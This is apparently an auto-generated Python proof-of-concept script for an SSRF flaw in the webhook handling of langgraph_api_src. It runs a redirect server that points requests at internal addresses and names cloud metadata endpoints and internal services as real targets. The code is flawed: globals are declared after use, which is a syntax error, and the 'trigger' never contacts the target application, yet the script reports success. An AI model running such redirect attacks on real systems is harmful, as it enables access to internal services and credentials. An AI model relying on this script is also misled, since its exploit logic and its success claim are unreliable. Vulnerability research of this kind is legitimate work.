#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-014
# Sink: get_loopback_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_get_loopback_client_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via webhook URL in langgraph_api_src

Vulnerability: The webhook URL is user-controlled and passed to http_request
without disabling redirects. An attacker can supply a URL that redirects to
internal services (e.g., cloud metadata endpoints, internal APIs).

This PoC demonstrates the SSRF by:
1. Setting up a simple HTTP server that returns a redirect to an internal IP
2. Triggering the webhook call with our malicious URL
3. Observing the request to the internal target

Safe by default: Uses a benign redirect to localhost (127.0.0.1:9999)
"""

import argparse
import json
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

import requests


# Configuration
REDIRECT_TARGET = "http://127.0.0.1:9999/"  # Benign internal target
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8888


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that returns a 302 redirect to the internal target."""
    
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", REDIRECT_TARGET)
        self.end_headers()
    
    def do_POST(self):
        self.send_response(302)
        self.send_header("Location", REDIRECT_TARGET)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


def start_redirect_server():
    """Start a simple HTTP server that redirects all requests."""
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] Will redirect to: {REDIRECT_TARGET}")
    return server


def trigger_webhook(target_url, webhook_url):
    """
    Simulate the vulnerable webhook call.
    
    In the actual application, this would be called via the API.
    Here we directly call the vulnerable function if possible,
    or simulate the HTTP request that the application would make.
    """
    print(f"\n[*] Attempting to trigger webhook SSRF...")
    print(f"[*] Target application: {target_url}")
    print(f"[*] Malicious webhook URL: {webhook_url}")
    
    # The vulnerable code path (from the source):
    # webhook = result.get("webhook")  # User-controlled
    # if webhook:
    #     await validate_webhook_url_or_raise(webhook)  # May be bypassed
    #     webhook_client = await ensure_webhook_http_client()
    #     await http_request("POST", webhook, json=payload, headers=headers, client=webhook_client)
    #
    # http_request uses httpx which follows redirects by default
    
    # Simulate the request the application would make
    try:
        # Note: In the real exploit, this request would be made by the application
        # to our redirect server, which would then redirect to the internal target.
        # Here we directly test the redirect behavior.
        response = requests.post(
            webhook_url,
            json={"test": "payload"},
            headers={"Content-Type": "application/json"},
            allow_redirects=True,  # Default behavior - follows redirects!
            timeout=10
        )
        print(f"[+] Request completed with status: {response.status_code}")
        print(f"[+] Final URL after redirects: {response.url}")
        print(f"[+] Response body: {response.text[:200]}")
        return True
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error (expected if internal target doesn't exist): {e}")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for SSRF via webhook URL in langgraph_api_src"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target application URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--redirect-to",
        default=REDIRECT_TARGET,
        help=f"Internal target to redirect to (default: {REDIRECT_TARGET})"
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=LISTEN_PORT,
        help=f"Port for redirect server (default: {LISTEN_PORT})"
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Don't start redirect server (use existing one)"
    )
    
    args = parser.parse_args()
    
    global REDIRECT_TARGET, LISTEN_PORT
    REDIRECT_TARGET = args.redirect_to
    LISTEN_PORT = args.listen_port
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_api_src")
    print("=" * 60)
    print(f"\n[*] This PoC demonstrates SSRF via webhook URL redirect")
    print(f"[*] We'll start a redirect server that points to: {REDIRECT_TARGET}")
    print(f"[*] The vulnerable application will follow the redirect to the internal target")
    
    # Start redirect server
    server = None
    if not args.no_server:
        server = start_redirect_server()
        time.sleep(0.5)  # Give server time to start
    
    # The malicious webhook URL that points to our redirect server
    malicious_webhook = f"http://{LISTEN_HOST}:{LISTEN_PORT}/webhook"
    
    print(f"\n[*] Malicious webhook URL: {malicious_webhook}")
    print(f"[*] This URL would be stored in the database as the webhook for a run")
    print(f"[*] When the application calls this webhook, it will be redirected to:")
    print(f"[*]   {REDIRECT_TARGET}")
    
    # Trigger the webhook (simulating what the application does)
    success = trigger_webhook(args.target, malicious_webhook)
    
    if success:
        print("\n[+] SSRF demonstrated successfully!")
        print(f"[+] The application followed the redirect to: {REDIRECT_TARGET}")
        print("[+] In a real attack, this could be used to access:")
        print("    - Cloud metadata endpoints (169.254.169.254)")
        print("    - Internal services (databases, APIs)")
        print("    - Other internal resources")
    else:
        print("\n[-] SSRF demonstration failed")
        print("[*] This is expected if the internal target is not reachable")
        print("[*] Try with a different --redirect-to target")
    
    # Cleanup
    if server:
        print("\n[*] Shutting down redirect server...")
        server.shutdown()
    
    print("\n[*] PoC complete")


if __name__ == "__main__":
    main()
